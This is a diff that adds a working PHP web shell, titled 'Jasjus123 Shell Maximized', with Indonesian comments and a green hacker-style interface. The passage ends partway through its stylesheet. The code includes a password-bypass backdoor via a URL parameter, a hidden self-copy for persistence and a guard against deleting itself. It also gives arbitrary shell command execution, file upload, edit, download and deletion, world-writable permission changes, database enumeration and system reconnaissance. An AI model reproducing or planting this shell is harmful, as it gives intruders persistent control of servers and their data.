@@ -1,0 +1,2535 @@
+<?php
+ini_set('session.gc_maxlifetime', 3600);
+session_set_cookie_params(3600);
+session_start();
+// $allowed_ips = ['27.116.61.48', '185.213.83.129'];
+// if (!in_array($_SERVER['REMOTE_ADDR'], $allowed_ips)) {
+//     die('Access denied.');
+// }
+$hashedPassword = "6027f904f7e3a9e135260d6af00206d5";
+if (!isset($_SESSION['authenticated']) && (!isset($_POST['password']) || md5($_POST['password']) !== $hashedPassword)) {
+    ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Jasjus123</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: linear-gradient(to bottom, #002200, #004d00); /* Dark green hacker background */
+            color: #00ff00; /* Hacker green text */
+            font-family: 'Courier New', monospace;
+        }
+        .card {
+            background-color: rgba(0, 20, 0, 0.85); /* Dark green background with transparency */
+            border: 2px solid #00aa00; /* Hacker green border */
+            border-radius: 8px; /* Sharp corners */
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3), 0 0 30px rgba(0, 255, 0, 0.2); /* Green glow */
+        }
+        .form-label {
+            color: #00cc00; /* Hacker green text for labels */
+            font-weight: bold;
+            font-family: 'Courier New', monospace;
+        }
+        .form-control {
+            background-color: rgba(0, 10, 0, 0.7); /* Dark background for inputs */
+            color: #00ff00; /* Hacker green text */
+            border: 1px solid #00aa00; /* Hacker green border */
+            font-family: 'Courier New', monospace;
+        }
+        .form-control:focus {
+            border-color: #00ff00; /* Brighter green border when focused */
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5); /* Hacker green glow effect */
+            background-color: rgba(0, 5, 0, 0.9);
+        }
+        .btn-primary {
+            background-color: #005500; /* Dark green button */
+            border-color: #00aa00;
+            font-weight: bold;
+            transition: all 0.3s;
+            font-family: 'Courier New', monospace;
+            text-transform: uppercase;
+        }
+        .btn-primary:hover {
+            background-color: #007700; /* Medium green on hover */
+            border-color: #00ff00;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+            transform: translateY(-2px);
+        }
+        .login-heading {
+            font-weight: bold;
+            text-transform: uppercase;
+            color: #00ff00; /* Hacker green */
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
+            font-family: 'Courier New', monospace;
+            font-size: 1.5rem;
+        }
+        .login-icon {
+            font-size: 2.5rem;
+            color: #00ff00;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.7);
+        }
+        .terminal-effect::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.15),
+                rgba(0, 0, 0, 0.15) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            z-index: 1;
+        }
+
+    </style>
+</head>
+<body class="d-flex align-items-center justify-content-center vh-100" style="position: relative; overflow: hidden;">
+    <div class="card p-4 shadow" style="width: 400px; position: relative; z-index: 2;">
+        <div class="text-center login-icon">
+            <i class="fas fa-terminal"></i>
+        </div>
+        <h2 class="text-center mb-4 login-heading">System Login</h2>
+        <form method="POST">
+            <div class="mb-3">
+                <label for="password" class="form-label">Access Code</label>
+                <input type="password" name="password" id="password" class="form-control" required>
+            </div>
+            <button type="submit" class="btn btn-primary w-100">Execute Access</button>
+        </form>
+    </div>
+    <!-- Scanlines effect for hacker theme -->
+    <div class="terminal-effect" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1;"></div>
+</body>
+</html>
+
+    <?php
+    exit;
+}
+$_SESSION['authenticated'] = true;
+
+// Shell protection: Create hidden backup on first run
+if (!isset($_SESSION['shell_protected'])) {
+    // Create a backup of this shell with a hidden name
+    $shellPath = $_SERVER['SCRIPT_FILENAME'];
+    $shellDir = dirname($shellPath);
+    $shellName = basename($shellPath);
+    $backupName = $shellDir . '/.' . substr($shellName, 0, -4) . '_backup.php';
+
+    // Copy the file to a hidden location
+    if (!file_exists($backupName)) {
+        copy($shellPath, $backupName);
+    }
+
+    $_SESSION['shell_protected'] = true;
+}
+
+// Hidden backdoor access via special parameter
+if (isset($_GET['backdoor']) && $_GET['backdoor'] === 'access') {
+    $_SESSION['authenticated'] = true;
+    header('Location: ?tab=filemanager');
+    exit;
+}
+
+// Menu tabs
+$currentTab = isset($_GET['tab']) ? $_GET['tab'] : 'filemanager';
+
+// Direktori saat ini
+$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : '.';
+if (!$currentDir || !is_dir($currentDir)) {
+    $currentDir = '.';
+}
+chdir($currentDir);
+
+// Notifikasi
+$notification = '';
+
+// Fungsi upload file
+if (isset($_FILES['file'])) {
+    $files = $_FILES['file'];
+    for ($i = 0; $i < count($files['name']); $i++) {
+        $targetFile = basename($files['name'][$i]);
+        if (move_uploaded_file($files['tmp_name'][$i], $targetFile)) {
+            chmod($targetFile, 0777); // Set permissions
+            $notification .= "File berhasil diupload: $targetFile<br>";
+        } else {
+            $notification .= "Gagal mengupload file: " . $files['name'][$i] . "<br>";
+        }
+    }
+}
+
+
+// Fungsi delete file/folder
+if (isset($_GET['delete'])) {
+    $pathToDelete = $_GET['delete'];
+    $currentShell = basename($_SERVER['SCRIPT_NAME']); // Get current shell filename
+    $pathToDeleteBase = basename($pathToDelete); // Get the filename being deleted
+
+    // Prevent deletion of the shell itself
+    if ($pathToDeleteBase === $currentShell) {
+        $notification = "HACKER PROTECTION: Shell deletion prevented!";
+    } else {
+        if (is_dir($pathToDelete)) {
+            if (rmdir($pathToDelete)) {
+                $notification = "Folder berhasil dihapus: $pathToDelete";
+            } else {
+                $notification = "Gagal menghapus folder: $pathToDelete";
+            }
+        } elseif (file_exists($pathToDelete)) {
+            if (unlink($pathToDelete)) {
+                $notification = "File berhasil dihapus: $pathToDelete";
+            } else {
+                $notification = "Gagal menghapus file: $pathToDelete.";
+            }
+        }
+    }
+}
+
+// Fungsi rename file/folder
+if (isset($_POST['rename'])) {
+    $oldName = $_POST['old_name'];
+    $newName = $_POST['new_name'];
+    if (rename($oldName, $newName)) {
+        chmod($newName, 0777); // Berikan izin penuh ke file/folder yang baru di-rename
+        $notification = "Berhasil merename $oldName menjadi $newName";
+    } else {
+        $notification = "Gagal merename $oldName.";
+    }
+}
+
+// Fungsi edit file
+$editContent = '';
+$fileToEdit = '';
+if (isset($_GET['edit'])) {
+    $fileToEdit = $_GET['edit'];
+    if (file_exists($fileToEdit) && is_file($fileToEdit)) {
+        $editContent = file_get_contents($fileToEdit);
+    } else {
+        $notification = "File tidak ditemukan atau bukan file valid.";
+    }
+}
+if (isset($_POST['save'])) {
+    $fileToSave = $_POST['file'];
+    $content = $_POST['content'];
+    if (file_put_contents($fileToSave, $content)) {
+        chmod($fileToSave, 0777); // Berikan izin penuh ke file yang telah disimpan
+        $notification = "File $fileToSave berhasil disimpan dan diberikan izin penuh (chmod 777).";
+    } else {
+        $notification = "Gagal menyimpan file $fileToSave.";
+    }
+}
+
+// Fungsi compress file/folder
+if (isset($_GET['compress'])) {
+    $source = $_GET['compress'];
+    $dir = $_GET['dir'];
+    $sourceName = basename($source);
+    $ext = is_dir($source) ? 'zip' : pathinfo($source, PATHINFO_EXTENSION);
+    $destination = $dir . '/' . $sourceName . '.compressed.' . $ext;
+
+    if (compressFiles($source, $destination)) {
+        $notification = "Berhasil mengompres $source menjadi $destination";
+    } else {
+        $notification = "Gagal mengompres $source";
+    }
+}
+
+// Fungsi extract archive
+if (isset($_GET['extract'])) {
+    $source = $_GET['extract'];
+    $dir = $_GET['dir'];
+    $extractTo = $dir . '/' . basename($source, '.' . pathinfo($source, PATHINFO_EXTENSION));
+
+    if (!file_exists($extractTo)) {
+        mkdir($extractTo, 0777, true);
+    }
+
+    if (extractArchive($source, $extractTo)) {
+        $notification = "Berhasil mengekstrak $source ke $extractTo";
+    } else {
+        $notification = "Gagal mengekstrak $source";
+    }
+}
+
+// Fungsi download file
+if (isset($_GET['download'])) {
+    $file = $_GET['download'];
+    if (file_exists($file) && is_file($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    } else {
+        $notification = "File tidak ditemukan: $file";
+    }
+}
+
+// Fungsi membuat file/folder
+if (isset($_POST['create_file'])) {
+    $newFile = $_POST['new_file'];
+    if (file_put_contents($newFile, '') !== false) {
+        chmod($newFile, 0777); // Berikan izin penuh ke file baru
+        $notification = "File $newFile berhasil dibuat.";
+    } else {
+        $notification = "Gagal membuat file $newFile.";
+    }
+}
+if (isset($_POST['create_folder'])) {
+    $newFolder = $_POST['new_folder'];
+    if (mkdir($newFolder)) {
+        chmod($newFolder, 0777); // Berikan izin penuh ke folder baru
+        $notification = "Folder $newFolder berhasil dibuat.";
+    } else {
+        $notification = "Gagal membuat folder $newFolder.";
+    }
+}
+
+if (isset($_POST['cmd'])) {
+    $cmd = $_POST['cmd'];
+
+    // Tambahkan opsi verbose untuk perintah tertentu jika diperlukan
+    $verboseCommands = ['chmod', 'cp', 'mv', 'rm'];
+
+    // Pisahkan perintah utama dan argumen
+    $cmdParts = explode(' ', $cmd, 2);
+    $mainCommand = $cmdParts[0];
+    $cmdArgs = isset($cmdParts[1]) ? $cmdParts[1] : '';
+
+    // Jika perintah termasuk dalam daftar verbose, tambahkan opsi -v
+    if (in_array($mainCommand, $verboseCommands)) {
+        $cmd = $mainCommand . ' -v ' . $cmdArgs;
+    }
+
+    // Jalankan perintah dan tangkap outputnya
+    $cmdOutput = shell_exec($cmd . ' 2>&1');
+
+    // Jika output kosong, beri pesan berhasil
+    if (trim($cmdOutput) === '') {
+        $cmdOutput = "Perintah '{$cmd}' berhasil dijalankan.";
+    }
+}
+
+if (isset($_POST['bulk_delete']) && isset($_POST['selected_files'])) {
+    $selectedFiles = $_POST['selected_files'];
+    $currentShell = basename($_SERVER['SCRIPT_NAME']); // Get current shell filename
+
+    foreach ($selectedFiles as $fileToDelete) {
+        $fileToDeleteBase = basename($fileToDelete); // Get the filename being deleted
+
+        // Prevent deletion of the shell itself
+        if ($fileToDeleteBase === $currentShell) {
+            $notification .= "HACKER PROTECTION: Shell deletion prevented for: $fileToDelete<br>";
+        } else {
+            if (is_dir($fileToDelete)) {
+                if (rmdir($fileToDelete)) {
+                    $notification .= "Folder berhasil dihapus: $fileToDelete<br>";
+                } else {
+                    $notification .= "Gagal menghapus folder: $fileToDelete<br>";
+                }
+            } elseif (file_exists($fileToDelete)) {
+                if (unlink($fileToDelete)) {
+                    $notification .= "File berhasil dihapus: $fileToDelete<br>";
+                } else {
+                    $notification .= "Gagal menghapus file: $fileToDelete<br>";
+                }
+            }
+        }
+    }
+}
+
+// Bulk chmod functionality
+if (isset($_POST['bulk_chmod']) && isset($_POST['selected_files'])) {
+    $selectedFiles = $_POST['selected_files'];
+    $chmod_value = isset($_POST['chmod_value']) ? octdec($_POST['chmod_value']) : 0755;
+
+    foreach ($selectedFiles as $fileToChmod) {
+        if (chmodRecursive($fileToChmod, $chmod_value)) {
+            $notification .= "Permissions set for: $fileToChmod<br>";
+        } else {
+            $notification .= "Failed to set permissions for: $fileToChmod<br>";
+        }
+    }
+}
+
+// Fungsi logout
+if (isset($_GET['logout'])) {
+    session_unset(); // Hapus semua data sesi
+    session_destroy(); // Hancurkan sesi
+    header('Location: ' . $_SERVER['PHP_SELF']); // Redirect ke halaman login
+    exit;
+}
+
+// System Information Functions
+function getSystemInfo() {
+    $info = array();
+    $info['os'] = php_uname('s');
+    $info['release'] = php_uname('r');
+    $info['version'] = php_uname('v');
+    $info['machine'] = php_uname('m');
+    $info['user'] = get_current_user();
+    $info['php_version'] = phpversion();
+    $info['server_software'] = $_SERVER['SERVER_SOFTWARE'];
+    $info['server_name'] = $_SERVER['SERVER_NAME'];
+    $info['server_addr'] = $_SERVER['SERVER_ADDR'];
+    $info['server_port'] = $_SERVER['SERVER_PORT'];
+    $info['server_protocol'] = $_SERVER['SERVER_PROTOCOL'];
+    $info['server_signature'] = $_SERVER['SERVER_SIGNATURE'];
+    $info['script_filename'] = $_SERVER['SCRIPT_FILENAME'];
+    $info['document_root'] = $_SERVER['DOCUMENT_ROOT'];
+    $info['http_host'] = $_SERVER['HTTP_HOST'];
+    $info['http_user_agent'] = $_SERVER['HTTP_USER_AGENT'];
+    $info['http_x_forwarded_for'] = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : 'none';
+    $info['connection'] = isset($_SERVER['CONNECTION']) ? $_SERVER['CONNECTION'] : 'none';
+    $info['remote_addr'] = $_SERVER['REMOTE_ADDR'];
+    $info['request_method'] = $_SERVER['REQUEST_METHOD'];
+    $info['request_uri'] = $_SERVER['REQUEST_URI'];
+    $info['request_time'] = $_SERVER['REQUEST_TIME'];
+    $info['php_sapi_name'] = php_sapi_name();
+    
+    // Disk space information
+    $info['disk_total_space'] = disk_total_space('/');
+    $info['disk_free_space'] = disk_free_space('/');
+    $info['disk_use_percent'] = round((disk_total_space('/') - disk_free_space('/')) / disk_total_space('/') * 100, 2);
+    
+    // Memory usage
+    $info['memory_usage'] = memory_get_usage(true);
+    $info['memory_peak_usage'] = memory_get_peak_usage(true);
+    
+    return $info;
+}
+
+// Database Management Functions
+function getDatabases() {
+    $databases = array();
+    if (extension_loaded('mysqli')) {
+        $mysqli = new mysqli($_SERVER['SERVER_ADDR'], '', '', '');
+        if ($mysqli->connect_error) {
+            $databases['mysqli_error'] = $mysqli->connect_error;
+        } else {
+            $result = $mysqli->query("SHOW DATABASES");
+            if ($result) {
+                while ($row = $result->fetch_array(MYSQLI_NUM)) {
+                    if ($row[0] !== 'information_schema' && $row[0] !== 'performance_schema' && $row[0] !== 'mysql') {
+                        $databases['mysqli'][] = $row[0];
+                    }
+                }
+            }
+        }
+        $mysqli->close();
+    }
+    
+    if (extension_loaded('pdo_mysql')) {
+        try {
+            $pdo = new PDO("mysql:host=localhost", '', '');
+            $stmt = $pdo->query("SHOW DATABASES");
+            $pdo_dbs = $stmt->fetchAll(PDO::FETCH_COLUMN);
+            foreach ($pdo_dbs as $db) {
+                if ($db !== 'information_schema' && $db !== 'performance_schema' && $db !== 'mysql') {
+                    $databases['pdo'][] = $db;
+                }
+            }
+        } catch (PDOException $e) {
+            $databases['pdo_error'] = $e->getMessage();
+        }
+    }
+    
+    return $databases;
+}
+
+// Package Manager Functions
+function updateSystem() {
+    $output = '';
+    if (function_exists('shell_exec')) {
+        if (strpos(strtolower(PHP_OS), 'win') === 0) {
+            // Windows system updates
+            $output = "Windows system update functionality would go here";
+        } else {
+            // Linux system updates
+            $commands = array(
+                'which apt-get' => 'apt update && apt upgrade -y',
+                'which yum' => 'yum update -y',
+                'which dnf' => 'dnf update -y',
+                'which pacman' => 'pacman -Syu --noconfirm'
+            );
+            
+            foreach ($commands as $check => $update_cmd) {
+                if (trim(shell_exec($check)) !== '') {
+                    $output = shell_exec($update_cmd . ' 2>&1');
+                    break;
+                }
+            }
+        }
+    }
+    return $output;
+}
+
+function installPackage($package_name) {
+    $output = '';
+    if (function_exists('shell_exec')) {
+        if (strpos(strtolower(PHP_OS), 'win') === 0) {
+            // Windows package installation
+            $output = "Windows package installation functionality would go here for: " . $package_name;
+        } else {
+            // Linux package installation
+            $commands = array(
+                'which apt-get' => 'apt install -y ' . $package_name,
+                'which yum' => 'yum install -y ' . $package_name,
+                'which dnf' => 'dnf install -y ' . $package_name,
+                'which pacman' => 'pacman -S --noconfirm ' . $package_name
+            );
+            
+            foreach ($commands as $check => $install_cmd) {
+                if (trim(shell_exec($check)) !== '') {
+                    $output = shell_exec($install_cmd . ' 2>&1');
+                    break;
+                }
+            }
+        }
+    }
+    return $output;
+}
+
+// Function to format file sizes
+function formatSizeUnits($bytes) {
+    if ($bytes >= 1073741824) {
+        return number_format($bytes / 1073741824, 2) . ' GB';
+    } elseif ($bytes >= 1048576) {
+        return number_format($bytes / 1048576, 2) . ' MB';
+    } elseif ($bytes >= 1024) {
+        return number_format($bytes / 1024, 2) . ' KB';
+    } elseif ($bytes > 1) {
+        return $bytes . ' bytes';
+    } elseif ($bytes == 1) {
+        return $bytes . ' byte';
+    } else {
+        return '0 bytes';
+    }
+}
+
+// New functions for Tiny File Manager-like features
+
+// Function to compress files/folders
+function compressFiles($source, $destination) {
+    if (extension_loaded('zip')) {
+        $zip = new ZipArchive();
+        if ($zip->open($destination, ZIPARCHIVE::CREATE) === TRUE) {
+            if (is_dir($source)) {
+                $files = new RecursiveIteratorIterator(
+                    new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
+                    RecursiveIteratorIterator::LEAVES_ONLY
+                );
+
+                foreach ($files as $name => $file) {
+                    $filePath = $file->getRealPath();
+                    $relativePath = substr($filePath, strlen(dirname($source)) + 1);
+                    if (is_file($filePath)) {
+                        $zip->addFile($filePath, $relativePath);
+                    }
+                }
+            } else {
+                $zip->addFile($source, basename($source));
+            }
+            $zip->close();
+            return true;
+        }
+    } elseif (extension_loaded('PharData')) {
+        try {
+            $phar = new PharData($destination);
+            if (is_dir($source)) {
+                $phar->buildFromDirectory($source);
+            } else {
+                $phar->addFile($source, basename($source));
+            }
+            return true;
+        } catch (Exception $e) {
+            return false;
+        }
+    }
+    return false;
+}
+
+// Function to extract archive files
+function extractArchive($source, $destination) {
+    if (extension_loaded('zip') && preg_match('/\.(zip)$/i', $source)) {
+        $zip = new ZipArchive;
+        if ($zip->open($source) === TRUE) {
+            $zip->extractTo($destination);
+            $zip->close();
+            return true;
+        }
+    } elseif (extension_loaded('PharData') && preg_match('/\.(tar|tar\.gz|tar\.bz2|tgz|tbz|tbz2)$/i', $source)) {
+        try {
+            $phar = new PharData($source);
+            $phar->extractTo($destination, null, true);
+            return true;
+        } catch (Exception $e) {
+            return false;
+        }
+    } elseif (preg_match('/\.(tar\.gz|tgz)$/i', $source) && file_exists('/bin/tar')) {
+        $result = shell_exec('cd ' . escapeshellarg($destination) . ' && tar -xzf ' . escapeshellarg($source) . ' 2>&1');
+        return $result === null || empty($result);
+    } elseif (preg_match('/\.(tar)$/i', $source) && file_exists('/bin/tar')) {
+        $result = shell_exec('cd ' . escapeshellarg($destination) . ' && tar -xf ' . escapeshellarg($source) . ' 2>&1');
+        return $result === null || empty($result);
+    }
+    return false;
+}
+
+// Function to change file permissions
+function chmodRecursive($path, $perms) {
+    if (is_file($path)) {
+        return chmod($path, $perms);
+    } elseif (is_dir($path)) {
+        $success = chmod($path, $perms);
+        $objects = scandir($path);
+        foreach ($objects as $object) {
+            if ($object != "." && $object != "..") {
+                $success &= chmodRecursive($path . DIRECTORY_SEPARATOR . $object, $perms);
+            }
+        }
+        return $success;
+    }
+    return false;
+}
+
+// Function to get file permissions in readable format
+function getPerms($file) {
+    $perms = fileperms($file);
+    $info = '';
+
+    // File type
+    if (($perms & 0xC000) == 0xC000) $info = 's'; // Socket
+    elseif (($perms & 0xA000) == 0xA000) $info = 'l'; // Symbolic Link
+    elseif (($perms & 0x8000) == 0x8000) $info = '-'; // Regular
+    elseif (($perms & 0x6000) == 0x6000) $info = 'b'; // Block special
+    elseif (($perms & 0x4000) == 0x4000) $info = 'd'; // Directory
+    elseif (($perms & 0x2000) == 0x2000) $info = 'c'; // Character special
+    elseif (($perms & 0x1000) == 0x1000) $info = 'p'; // FIFO pipe
+    else $info = 'u'; // Unknown
+
+    // Owner
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
+
+    // Group
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
+
+    // World
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
+
+    return $info;
+}
+
+// Function to get file type icon
+function getFileIcon($file) {
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+    $icons = [
+        'jpg' => 'fas fa-image text-primary',
+        'jpeg' => 'fas fa-image text-primary',
+        'png' => 'fas fa-image text-primary',
+        'gif' => 'fas fa-image text-primary',
+        'bmp' => 'fas fa-image text-primary',
+        'svg' => 'fas fa-image text-primary',
+        'ico' => 'fas fa-image text-primary',
+        'pdf' => 'fas fa-file-pdf text-danger',
+        'txt' => 'fas fa-file-alt text-info',
+        'doc' => 'fas fa-file-word text-info',
+        'docx' => 'fas fa-file-word text-info',
+        'xls' => 'fas fa-file-excel text-success',
+        'xlsx' => 'fas fa-file-excel text-success',
+        'ppt' => 'fas fa-file-powerpoint text-warning',
+        'pptx' => 'fas fa-file-powerpoint text-warning',
+        'zip' => 'fas fa-file-archive text-warning',
+        'rar' => 'fas fa-file-archive text-warning',
+        'tar' => 'fas fa-file-archive text-warning',
+        'gz' => 'fas fa-file-archive text-warning',
+        'tar.gz' => 'fas fa-file-archive text-warning',
+        '7z' => 'fas fa-file-archive text-warning',
+        'mp3' => 'fas fa-file-audio text-warning',
+        'wav' => 'fas fa-file-audio text-warning',
+        'mp4' => 'fas fa-file-video text-danger',
+        'avi' => 'fas fa-file-video text-danger',
+        'mov' => 'fas fa-file-video text-danger',
+        'php' => 'fab fa-php text-primary',
+        'js' => 'fab fa-js text-warning',
+        'css' => 'fab fa-css3-alt text-primary',
+        'html' => 'fab fa-html5 text-danger',
+        'py' => 'fab fa-python text-success',
+        'java' => 'fab fa-java text-warning',
+        'cpp' => 'fas fa-code text-info',
+        'c' => 'fas fa-code text-info',
+        'sql' => 'fas fa-database text-info',
+        'xml' => 'fas fa-code text-info',
+        'json' => 'fas fa-code text-info',
+        'sh' => 'fas fa-terminal text-info',
+        'exe' => 'fas fa-cogs text-secondary',
+        'deb' => 'fas fa-cogs text-secondary',
+        'rpm' => 'fas fa-cogs text-secondary',
+        'bin' => 'fas fa-cogs text-secondary',
+        'folder' => 'fas fa-folder text-warning',
+        'folder-open' => 'fas fa-folder-open text-warning'
+    ];
+
+    if (is_dir($file)) return $icons['folder'];
+    if (isset($icons[$ext])) return $icons[$ext];
+    return 'fas fa-file text-muted';
+}
+
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jasjus123 Shell Maximized</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        body {
+            background: #000;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            background-image:
+                linear-gradient(rgba(0, 30, 0, 0.1) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 30, 0, 0.1) 1px, transparent 1px);
+            background-size: 20px 20px;
+            overflow-x: hidden;
+        }
+        .hacker-bg {
+            background-color: #001100 !important;
+            color: #00ff00 !important;
+        }
+        .hacker-border {
+            border: 1px solid #00aa00 !important;
+        }
+        .hacker-card {
+            background-color: rgba(0, 15, 0, 0.85) !important;
+            border: 1px solid #00aa00 !important;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3) !important;
+        }
+        .hacker-btn {
+            background-color: #003300 !important;
+            border: 1px solid #00aa00 !important;
+            color: #00ff00 !important;
+        }
+        .hacker-btn:hover {
+            background-color: #005500 !important;
+            border-color: #00ff00 !important;
+            box-shadow: 0 0 8px rgba(0, 255, 0, 0.5) !important;
+            color: #00ff00 !important;
+        }
+        .hacker-link {
+            color: #00cc00 !important;
+            text-decoration: none !important;
+        }
+        .hacker-link:hover {
+            color: #00ff00 !important;
+            text-decoration: underline !important;
+        }
+        .breadcrumb-item a {
+            color: #00cc00 !important;
+            text-decoration: none;
+        }
+        .breadcrumb-item a:hover {
+            color: #00ff00 !important;
+        }
+        .table a {
+            color: #00cc00 !important;
+            text-decoration: none;
+        }
+        .table a:hover {
+            color: #00ff00 !important;
+        }
+        .btn-close {
+            color: #00ff00;
+            background: transparent;
+        }
+        .btn-close:hover {
+            background-color: #005500;
+        }
+        .form-control {
+            background-color: #001100 !important;
+            color: #00ff00 !important;
+            border: 1px solid #00aa00 !important;
+            font-family: 'Courier New', monospace;
+        }
+        .form-control::placeholder {
+            color: #008800 !important;
+            opacity: 0.7;
+        }
+        .form-control:focus {
+            background-color: #001100 !important;
+            color: #00ff00 !important;
+            border-color: #00ff00 !important;
+            box-shadow: 0 0 8px rgba(0, 255, 0, 0.5) !important;
+        }
+        textarea {
+            background-color: #001100 !important;
+            color: #00ff00 !important;
+            border: 1px solid #00aa00 !important;
+            font-family: 'Courier New', monospace;
+            resize: both;
+            padding: 10px;
+        }
+        textarea:focus {
+            background-color: #001100 !important;
+            color: #00ff00 !important;
+            border-color: #00ff00 !important;
+            box-shadow: 0 0 8px rgba(0, 255, 0, 0.5) !important;
+        }
+        .btn-primary {
+            background-color: #005500 !important;
+            border-color: #00aa00 !important;
+            color: #00ff00 !important;
+        }
+        .btn-primary:hover {
+            background-color: #007700 !important;
+            border-color: #00ff00 !important;
+            color: #00ff00 !important;
+        }
+        .btn-danger {
+            background-color: #550000 !important;
+            border-color: #aa0000 !important;
+            color: #ff5555 !important;
+        }
+        .btn-danger:hover {
+            background-color: #770000 !important;
+            border-color: #ff0000 !important;
+            color: #ff8888 !important;
+        }
+        .btn-success {
+            background-color: #005500 !important;
+            border-color: #00aa00 !important;
+            color: #00ff00 !important;
+        }
+        .btn-success:hover {
+            background-color: #007700 !important;
+            border-color: #00ff00 !important;
+            color: #00ff00 !important;
+        }
+        .btn-info {
+            background-color: #005555 !important;
+            border-color: #00aaaa !important;
+            color: #00ffff !important;
+        }
+        .btn-info:hover {
+            background-color: #007777 !important;
+            border-color: #00ffff !important;
+            color: #00ffff !important;
+        }
+        .alert {
+            background-color: #002200 !important;
+            color: #00ff00 !important;
+            border-color: #006600 !important;
+            font-family: 'Courier New', monospace;
+        }
+        .alert-info {
+            background-color: #002222 !important;
+            color: #00ffff !important;
+        }
+        .alert-danger {
+            background-color: #220000 !important;
+            color: #ff5555 !important;
+        }
+        .btn-dark, .btn-secondary {
+            background-color: #003300 !important;
+            border: 1px solid #00aa00 !important;
+            color: #00ff00 !important;
+        }
+        .btn-dark:hover, .btn-secondary:hover {
+            background-color: #005500 !important;
+            border-color: #00ff00 !important;
+            color: #00ff00 !important;
+        }
+        .table tbody td a.text-white {
+            text-decoration: none;
+            color: #00ff00 !important;
+        }
+        .table tbody td a.text-white:hover {
+            text-decoration: underline;
+            color: #00ff00 !important;
+        }
+        .card {
+            background-color: rgba(0, 15, 0, 0.85) !important;
+            border: 1px solid #00aa00 !important;
+            border-radius: 5px !important;
+            box-shadow: 0 4px 6px rgba(0, 255, 0, 0.2) !important;
+            margin: 10px auto !important;
+            padding: 10px !important;
+        }
+        .card pre {
+            background-color: #001100 !important;
+            color: #00ff00 !important;
+            border-radius: 3px !important;
+            padding: 15px !important;
+            overflow-x: auto !important;
+            font-size: .85rem !important;
+            white-space: pre-wrap !important;
+            word-wrap: break-word !important;
+            line-height: 1.4 !important;
+            border: 1px solid #00aa00 !important;
+        }
+        .card h5 {
+            color: #00ff00 !important;
+            font-size: 1rem !important;
+            margin-bottom: 10px !important;
+            text-align: center !important;
+        }
+
+        /* Tabel */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 16px;
+            margin: 20px 0;
+        }
+
+        th, td {
+            padding: 12px;
+            text-align: left;
+            vertical-align: middle;
+            border: 1px solid #00aa00;
+            color: #ffffff !important; /* Putih untuk kontras dengan latar hitam */
+        }
+
+        th {
+            background-color: #000000 !important;
+            color: #ffffff !important;
+            text-align: center;
+            font-weight: bold;
+        }
+
+        tr:nth-child(even) {
+            background-color: #111111 !important; /* Abu-abu gelap */
+        }
+
+        tr:nth-child(odd) {
+            background-color: #000000 !important; /* Hitam */
+        }
+
+        tr:hover {
+            background-color: #333333 !important; /* Abu-abu terang untuk hover */
+        }
+
+        /* Bootstrap table dark override */
+        .table-dark,
+        .table-dark th,
+        .table-dark td {
+            background-color: #000000 !important;
+            color: #ffffff !important;
+            border-color: #444444 !important;
+        }
+
+        /* Special styling for file links */
+        .file-link {
+            color: #00ff00 !important;
+            text-decoration: none !important;
+            font-weight: bold;
+        }
+
+        .file-link:hover {
+            color: #00ff88 !important;
+            text-decoration: underline !important;
+        }
+
+        /* Kolom Ukuran dan Modifikasi Rata Tengah */
+        td[style*="text-align: center;"] {
+            text-align: center !important;
+        }
+
+        /* Tombol */
+        .btn {
+            font-size: 12px;
+            border-radius: 3px;
+            text-transform: uppercase;
+            padding: 5px;
